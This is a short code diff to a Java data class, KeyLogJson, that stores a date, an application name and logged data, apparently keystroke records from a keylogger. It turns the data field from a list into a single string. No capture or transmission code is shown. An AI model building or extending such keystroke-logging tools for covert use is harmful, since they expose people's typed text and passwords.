@@ -10,9 +10,9 @@ public class KeyLogJson {
 
     private String logDate;
     private String logApp;
-    private ArrayList<String> logData;
+    private String logData;
 
-    public KeyLogJson(String logDate, String logApp, ArrayList<String> logData) {
+    public KeyLogJson(String logDate, String logApp, String logData) {
         this.logDate = logDate;
         this.logApp = logApp;
         this.logData = logData;
@@ -20,15 +20,11 @@ public class KeyLogJson {
 
     public String getLogDate() { return logDate; }
     public String getLogApp() { return logApp; }
-    public ArrayList<String> getLogData() { return logData; }
+    public String getLogData() { return logData; }
 
     @Override
     public String toString() {
-        String logDataStr = "";
-        for (String data : logData) {
-            logDataStr += ("|" + data.replace(" ", "_") + "|");
-        }
-        return new String().format("KeyLog {" + "Date=%s" + "APP=%s" + "Data=%s}", logDate, logApp, logDataStr);
+        return new String().format("KeyLog {" + "Date=%s" + "APP=%s" + "Data=%s}", logDate, logApp, logData);
     }
 
 
